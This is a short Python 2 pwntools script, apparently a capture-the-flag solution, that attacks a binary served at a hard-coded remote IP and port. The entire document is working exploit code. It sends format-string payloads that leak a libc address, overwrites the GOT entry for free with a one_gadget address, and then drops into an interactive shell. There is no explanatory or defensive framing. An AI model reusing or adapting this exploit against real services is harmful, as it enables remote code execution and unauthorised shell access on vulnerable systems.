from pwn import *
context(os='linux',arch='amd64',timeout=0.1)
#context.log_level='debug'
#offset=8
_start=0x0000000000400AA0
elf=ELF('/home/troy/Desktop/exploit_1')
io=remote('118.25.216.151',10001)
io.recv()
io.sendline('%13$p%4197006caaaa%12$llnaaaaaaa'+p64(elf.got['free']))
io.recvuntil('Hello ')
addr=io.recv(14)
libc_addr=(eval(str(addr))-457984)
print hex(libc_addr)
io.recv(timeout=0.1)
io.sendline('16')
io.recv()
io.sendline('a')
io.recv()
one_gadget=libc_addr+0x45216
print "one_gadget is:"+hex(one_gadget)
one_gadget=str(hex(one_gadget))[6:]
one_gadget=eval('0x'+one_gadget)
print "Now it is:"+str(hex(one_gadget))
a=eval(str('0x'+hex(one_gadget)[2:6]))
c=0x10000-a
b=eval(str('0x'+hex(one_gadget)[6:10]))+c
payload=('%'+str(a)+'c%13$hn'+'%'+str(b)+'c%12$hn').ljust(32,'a')+p64(0x0000000000602018)+p64(0x000000000060201A)
io.send(payload.ljust(50,'\x00'))
io.recv(timeout=0.1)
io.sendline('16')
io.recv()
io.sendline('a')
io.interactive()